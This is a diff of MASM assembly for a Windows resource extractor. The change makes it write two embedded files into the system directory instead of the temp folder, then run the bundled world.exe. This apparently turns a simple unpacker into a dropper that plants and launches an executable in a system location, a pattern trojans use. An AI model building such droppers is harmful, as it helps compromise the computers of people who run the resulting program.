@@ -21,8 +21,10 @@ IDI_ICON1       equ 101
 TDFILE1         equ 102
 TDFILE2         equ 103
 
-LFile1          db "HELLO.EXE",0
-LFile2          db "WORLD.TXT",0
+LFile1          db "hello.txt",0
+LFile2          db "world.exe",0
+
+LCMDLINE        db "\",0
 
 ;  --------------------------------------------------------------------------------
 ;  uninitialized data
@@ -33,7 +35,7 @@ hResource       dd ?
 ResSize         dd ?
 hOutFile        dd ?
 Written         dd ?
-TempDir         db 128 dup (?)
+SysDir          db 128 dup (?)
 
 
 ;  --------------------------------------------------------------------------------
@@ -48,8 +50,9 @@ start:
             invoke ExitProcess, 0
 
 ExtractFile PROC hFile:DWORD, myFile:DWORD
-            invoke GetTempPath, sizeof TempDir, offset TempDir
-            invoke lstrcat, offset TempDir, myFile
+            invoke GetSystemDirectory, addr SysDir, sizeof SysDir
+            invoke lstrcat, offset SysDir, addr LCMDLINE
+            invoke lstrcat, offset SysDir, myFile
             invoke FindResource, NULL, hFile, RT_RCDATA
             .if eax != 0
                 mov hResource, eax
@@ -57,7 +60,7 @@ ExtractFile PROC hFile:DWORD, myFile:DWORD
                 invoke SizeofResource, NULL, eax
                 mov ResSize, eax
 
-                invoke CreateFile, offset TempDir, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, \
+                invoke CreateFile, offset SysDir, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, \
                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL
                 .if eax != INVALID_HANDLE_VALUE
                     mov hOutFile, eax
@@ -66,7 +69,10 @@ ExtractFile PROC hFile:DWORD, myFile:DWORD
                     invoke LockResource, eax
                     invoke WriteFile, hOutFile, eax, ResSize, ADDR Written, NULL
                     invoke CloseHandle, hOutFile
-                    invoke ShellExecute, NULL, NULL, offset TempDir, NULL, NULL, SW_SHOWNORMAL
+                    invoke lstrcmpi, myFile, offset LFile2
+                    .if eax == 0
+                        invoke ShellExecute, NULL, NULL, offset SysDir, NULL, NULL, SW_SHOWNORMAL
+                    .endif
                 .endif
             .endif
                     
